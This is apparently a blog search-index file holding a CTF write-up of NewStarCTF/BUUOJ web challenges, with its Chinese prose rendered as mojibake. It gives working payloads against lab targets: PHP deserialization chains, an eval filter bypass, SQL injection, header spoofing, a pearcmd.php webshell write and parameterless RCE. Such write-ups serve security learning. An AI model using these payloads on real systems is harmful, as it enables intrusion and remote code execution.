<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>buuåˆ·é¢˜</title>
      <link href="/2025/07/10/buu%E5%88%B7%E9%A2%98/"/>
      <url>/2025/07/10/buu%E5%88%B7%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="NewStarCTF-å…¬å¼€èµ›èµ›é“-UnserializeOne"><a href="#NewStarCTF-å…¬å¼€èµ›èµ›é“-UnserializeOne" class="headerlink" title="[NewStarCTF å…¬å¼€èµ›èµ›é“]UnserializeOne"></a>[NewStarCTF å…¬å¼€èµ›èµ›é“]UnserializeOne</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">\<span class="comment">#Something useful for you : https://zhuanlan.zhihu.com/p/377676274</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF, &quot;</span>.<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$obj</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;CTFers&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun</span>, <span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;cla = <span class="keyword">clone</span> <span class="variable">$var</span>[<span class="number">0</span>];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;obj-&gt;cmd))&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">  <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">phpååºåˆ—åŒ–é¢˜ç›®</span><br><span class="line"></span><br><span class="line">popé“¾æ„é€ destruct----ã€‹call---&gt;<span class="keyword">clone</span>----&gt;tostring---&gt;invoke</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$res</span> = <span class="keyword">new</span> <span class="title class_">Start</span>;</span><br><span class="line"><span class="variable">$res</span>-&gt;name = <span class="keyword">new</span> <span class="title class_">Sec</span>;<span class="comment">//ç¬¬ä¸€æ¡é“¾</span></span><br><span class="line"><span class="variable">$res</span>-&gt;name-&gt;obj = <span class="keyword">new</span> <span class="title class_">Easy</span>;<span class="comment">//ç¬¬äºŒæ¡é“¾</span></span><br><span class="line"><span class="variable">$res</span>-&gt;name-&gt;<span class="keyword">var</span>=<span class="keyword">new</span> eeee;<span class="comment">//ç¬¬ä¸‰æ¡é“¾</span></span><br><span class="line"><span class="variable">$res</span>-&gt;name-&gt;<span class="keyword">var</span>-&gt;obj=<span class="keyword">new</span> <span class="title class_">Start</span>;<span class="comment">//ç¬¬å››æ¡é“¾</span></span><br><span class="line"><span class="variable">$res</span>-&gt;name-&gt;<span class="keyword">var</span>-&gt;obj-&gt;func=<span class="keyword">new</span> <span class="title class_">Sec</span>;<span class="comment">//ç¬¬äº”æ¡é“¾</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-R-C-E"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-R-C-E" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]R!C!E!"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]R!C!E!</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_POST[&#x27;password&#x27;])&amp;&amp;isset($_POST[&#x27;e_v.a.l&#x27;]))&#123;</span><br><span class="line">  $password=md5($_POST[&#x27;password&#x27;]);</span><br><span class="line">  $code=$_POST[&#x27;e_v.a.l&#x27;];</span><br><span class="line">  if(substr($password,0,6)===&quot;c4d038&quot;)&#123;</span><br><span class="line">    if(!preg_match(&quot;/flag|system|pass|cat|ls/i&quot;,$code))&#123;</span><br><span class="line">      eval($code);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>å¯¹å‚æ•°passwordè¿›è¡Œmd5å¤„ç†ï¼Œæ£€æµ‹å…¶å‰6ä½æ˜¯å¦æ˜¯æ‰€éœ€è¦çš„å€¼ï¼Œä¹‹åå¯¹è¾“å…¥çš„å‘½ä»¤è¿›è¡Œäº†è¿‡æ»¤</p><p>è¿˜æœ‰â€-â€œè¢«è§£æä¸ºâ€ .â€isccç¢°è§è¿‡</p><p>ä½¿ç”¨[å³å¯(postä¼ å‚ç‰¹æ€§)</p><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704101644293.png" class="" title="image-20250704101644293"><p>password&#x3D;USriMT35mYgUlenwusWV&amp;e[v.a.l&#x3D;echo(<code>more /fl\ag</code>);</p><p>exp</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">CHARS = string.ascii_letters + string.digits</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmp_md5</span>(<span class="params">substr, stop_event, str_len, start=<span class="number">0</span>, size=<span class="number">20</span></span>):</span><br><span class="line">    <span class="keyword">global</span> CHARS</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> stop_event.is_set():</span><br><span class="line">        rnds = <span class="string">&#x27;&#x27;</span>.join(random.choice(CHARS) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(size))</span><br><span class="line">        md5 = hashlib.md5(rnds.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">if</span> md5.hexdigest()[start: start+str_len] == substr:</span><br><span class="line">            <span class="built_in">print</span> (rnds)</span><br><span class="line">            stop_event.<span class="built_in">set</span>()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    substr = <span class="string">&quot;c4d038&quot;</span></span><br><span class="line">    str_len = <span class="built_in">len</span>(substr)</span><br><span class="line">    cpus = multiprocessing.cpu_count()</span><br><span class="line">    stop_event = multiprocessing.Event()</span><br><span class="line">    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,</span><br><span class="line">                                         stop_event, str_len, <span class="number">0</span>))</span><br><span class="line">                 <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cpus)]</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.start()</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.join()</span><br></pre></td></tr></table></figure><h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-EasyLogin"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-EasyLogin" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]EasyLogin"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]EasyLogin</h1><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704104214430.png" class="" title="image-20250704104214430"><p>æ˜¯ä¸ªç™»å½•ç³»ç»ŸæŠ“åŒ…çˆ†ç ´ï¼Œå¯†ç ä½¿ç”¨md5è¿›è¡ŒåŠ å¯†</p><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704104249692.png" class="" title="image-20250704104249692"><p>è´¦æˆ·adminå¯†ç 000000</p><p>ç™»å½•æŠ“åŒ…</p><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704104321400.png" class="" title="image-20250704104321400">ç™»å½•è¿›å…¥ç•Œé¢å¾—åˆ°flag<h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-Begin-of-HTTP"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-Begin-of-HTTP" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]Begin of HTTP"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]Begin of HTTP</h1><p>æ ¹æ®æç¤ºæŠ“åŒ…ä¸€æ­¥ä¸€æ­¥è¿›è¡Œå³å¯</p><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704110328804.png" class="" title="image-20250704110328804"><p>æœ€åä¸€æ­¥ä¿®æ”¹æœ¬åœ°ipåœ°å€å‘ç°å¸¸è§„X-Forwarded-For: 127.0.0.1æ— æ³•æˆåŠŸ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"> 1 Client-IP:127.0.0.1</span><br><span class="line"> 2 Forwarded-For-Ip: 127.0.0.1</span><br><span class="line"> 3 Forwarded-For: 127.0.0.1</span><br><span class="line"> 4 Forwarded-For: localhost</span><br><span class="line"> 5 Forwarded:127.0.0.1</span><br><span class="line"> 6 Forwarded: localhost</span><br><span class="line"> 7 True-Client-IP:127.0.0.1</span><br><span class="line"> 8 X-Client-IP: 127.0.0.1</span><br><span class="line"> 9 X-Custom-IP-Authorization : 127.0.0.1</span><br><span class="line">10 X-Forward-For: 127.0.0.1</span><br><span class="line">11 X-Forward: 127.0.0.1</span><br><span class="line">12 X-Forward: localhost</span><br><span class="line">13 X-Forwarded-By:127.0.0.1</span><br><span class="line">14 X-Forwarded-By: localhost</span><br><span class="line">15 X-Forwarded-For-Original: 127.0.0.1</span><br><span class="line">16 X-Forwarded-For-original: localhost</span><br><span class="line">17 X-Forwarded-For: 127.0.0.1</span><br><span class="line">18 X-Forwarded-For: localhost</span><br><span class="line">19 X-Forwarded-Server: 127.0.0.1</span><br><span class="line">20 X-Forwarded-Server: localhost</span><br><span class="line">21 X-Forwarded: 127.0.0.1</span><br><span class="line">22 X-Forwarded: localhost</span><br><span class="line">23 X-Forwared-Host: 127.0.0.1</span><br><span class="line">24 X-Forwared-Host: localhost</span><br><span class="line">25 X-Host: 127.0.0.1</span><br><span class="line">26 X-Host: localhost</span><br><span class="line">27 X-HTTP-Host-Override : 127.0.0.1</span><br><span class="line">28 X-Originating-IP: 127.0.0.1</span><br><span class="line">29 X-Real-IP: 127.0.0.1</span><br><span class="line">30 X-Remote-Addr: 127.0.0.1</span><br><span class="line">31 X-Remote-Addr : localhost</span><br><span class="line">32 X-Remote-IP: 127.0.0.1</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªä¸€ä¸ªå®éªŒå‘ç° X-Real-IP: 127.0.0.1å¯ä»¥</p><h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-Begin-of-Upload"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-Begin-of-Upload" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]Begin of Upload"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]Begin of Upload</h1><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>æ–‡ä»¶ä¸Šä¼ ï¼Œå…ˆå°è¯•å‡ ä¸ªæ–‡ä»¶ä¸Šä¼ å›¾ç‰‡åæŠ“åŒ…æ›´æ”¹åç¼€å‘ç°ç›´æ¥èƒ½ä¼ å…¥</p><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704111246140.png" class="" title="image-20250704111246140"><h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-Begin-of-PHP"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-Begin-of-PHP" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]Begin of PHP"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]Begin of PHP</h1><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704113457445.png" class="" title="image-20250704113457445"><p>å…¨éƒ¨ä½¿ç”¨æ•°ç»„ç»•è¿‡å³å¯</p><p>key1[]&#x3D;1<br>&amp;key2[]&#x3D;2<br>&amp;key4[]&#x3D;1<br>&amp;key5[]&#x3D;2024</p><p>key3[]&#x3D;1&amp;flag5[]&#x3D;.</p><h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-æ³„æ¼çš„ç§˜å¯†"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-æ³„æ¼çš„ç§˜å¯†" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]æ³„æ¼çš„ç§˜å¯†"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]æ³„æ¼çš„ç§˜å¯†</h1><p>robots.txtå­˜åœ¨ä¸€åŠflagï¼Œæ‰«å‡ºç½‘ç«™å¤‡ä»½<a href="http://www.zipå¾—åˆ°å¦ä¸€åŠ/">www.zipå¾—åˆ°å¦ä¸€åŠ</a></p><h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-ez-sql"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-ez-sql" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]ez_sql"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]ez_sql</h1><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704143339398.png" class="" title="image-20250704143339398"><p>æµ‹è¯•å­˜åœ¨wafå¯¹and orç­‰å…³é”®å­—éƒ½è¿›è¡Œäº†è¿‡æ»¤ ä½¿ç”¨å¤§å°å†™ç»•è¿‡å³å¯</p><p>?id&#x3D;-1â€™ UniOn seLect database(),2,3,4,GROUP_CONCAT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA&#x3D; â€˜ctfâ€™â€“+</p><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704144113407.png" class="" title="image-20250704144113407"><p><a href="http://ff3d18d2-74a4-405a-a674-099ca58fd1b1.node5.buuoj.cn:81/?id=-1">http://ff3d18d2-74a4-405a-a674-099ca58fd1b1.node5.buuoj.cn:81/?id=-1</a>â€˜ UniOn seLect database(),2,3,4,flag FROM here_is_flag â€“+</p><p>flag{f1cb957b-fa7d-4e98-b769-4b9c9f60f0e9}</p><h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-Upload-again"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-Upload-again" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]Upload again!"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]Upload again!</h1><p>å¯¹æ–‡ä»¶åç¼€å’Œæ–‡ä»¶å†…å®¹å­˜åœ¨ä¸€å®šæƒ…å†µçš„è¿‡æ»¤</p><p>é…åˆ.htaccessæ–‡ä»¶ä¸Šä¼ ä»¥ä¸‹æœ¨é©¬å³å¯</p><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704145512842.png" class="" title="image-20250704145512842"><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704145620831.png" class="" title="image-20250704145620831"><h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-æ¸¸æˆé«˜æ‰‹"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-æ¸¸æˆé«˜æ‰‹" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]æ¸¸æˆé«˜æ‰‹"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]æ¸¸æˆé«˜æ‰‹</h1><p>æŸ¥çœ‹æºä»£ç å‘ç°éœ€è¦gameScoreçš„å€¼å¤§äºä¸€å®šçš„æ•°æ‰ç»™flag</p><p>æ§åˆ¶å°ä¿®æ”¹æˆåŠŸ</p><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704151345043.png" class="" title="image-20250704151345043"><h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-Include-ğŸ"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-Include-ğŸ" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]Include ğŸ"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]Include ğŸ</h1><p>æ ¹æ®æç¤ºè¯»å–phpinfo.phpæ–‡ä»¶æœç´¢flag</p><p>ç»™å‡ºæç¤ºæŸ¥çœ‹register_argc_argv</p><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704152432301.png" class="" title="image-20250704152432301"><p>å‘ç°ä¸Šç½‘æŸ¥è¯¢èµ„æ–™å‘ç°register_argc_argvå¯ä»¥è¿›è¡Œrce</p><p>é€šè¿‡è°ƒç”¨pearcmd.phpè¿›è¡Œrce</p><p>register_argc_argvçš„ä¸¤ä¸ªç‰¹ç‚¹</p><p>1.&amp;ç¬¦æ— å‘åˆ†å‰²å‚æ•°ï¼ŒçœŸæ­£èƒ½åˆ†å‰²å‚æ•°çš„æ˜¯åŠ å·</p><p>2.ç­‰å·æ— æ³•èµ‹å€¼ï¼Œè€Œæ˜¯ä¼šç›´æ¥è¢«ä¼ è¿›å»å½“ä½œå‚æ•°</p><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/2de99d32-2d60-43af-8ee5-0111fdc52f38.png" class="" title="image-20211101074033767.png"><p>?+config-create+&#x2F;&amp;file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;&#x2F;<?=@eval($_POST['cmd']);?>+&#x2F;tmp&#x2F;test.php</p><p>æ¨¡æ‹ŸpearæŒ‡ä»¤åˆ›å»ºä¸€ä¸ªtest.phpçš„æœ¨é©¬æ–‡ä»¶</p><p>å‚è€ƒæ–‡ç« <a href="https://tttang.com/archive/1312/#toc_0x06-pearcmdphp">Docker PHPè£¸æ–‡ä»¶æœ¬åœ°åŒ…å«ç»¼è¿° - è·³è·³ç³–</a></p><h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-R-C-E-1"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-R-C-E-1" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]R!!C!!E!!"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]R!!C!!E!!</h1><p>gitæ–‡ä»¶æ³„éœ²</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rcebo0g1pop.php </span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if (&#x27;;&#x27; === preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;star&#x27;])) &#123;</span><br><span class="line">  if(!preg_match(&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;,$_GET[&#x27;star&#x27;]))&#123;</span><br><span class="line">    eval($_GET[&#x27;star&#x27;]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ— å‚æ•°rce</p><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704201307267.png" class="" title="image-20250704201307267"><p>å¯¹è¯·æ±‚å¤´è¿›è¡Œä¿®æ”¹å³å¯</p><p>eval(pos(array_reverse(getallheaders()))); </p><h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-Unserializeï¼Ÿ"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-Unserializeï¼Ÿ" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]Unserializeï¼Ÿ"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]Unserializeï¼Ÿ</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">// Maybe you need learn some knowledge about deserialize?</span><br><span class="line">class evil &#123;</span><br><span class="line">  private $cmd;</span><br><span class="line"></span><br><span class="line">  public function __destruct()</span><br><span class="line">  &#123;</span><br><span class="line">    if(!preg_match(&quot;/cat|tac|more|tail|base/i&quot;, $this-&gt;cmd))&#123;</span><br><span class="line">      @system($this-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unserialize($_POST[&#x27;unser&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">ç›´æ¥åºåˆ—åŒ–evilå³å¯</span><br><span class="line"></span><br><span class="line">æ³¨æ„privateå±æ€§éœ€è¦åœ¨å‰ååŠ å…¥%00</span><br><span class="line"></span><br><span class="line">unser=O:4:&quot;evil&quot;:1:&#123;s:9:&quot;%00evil%00cmd&quot;;s:35:&quot;ca\t /th1s_1s_fffflllll4444aaaggggg&quot;;&#125;</span><br><span class="line"></span><br><span class="line">ä½¿ç”¨\ç»•è¿‡æ­£åˆ™å³å¯</span><br></pre></td></tr></table></figure><h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-R-C-E-2"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-R-C-E-2" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]R!!!C!!!E!!!"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]R!!!C!!!E!!!</h1><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250705095556099.png" 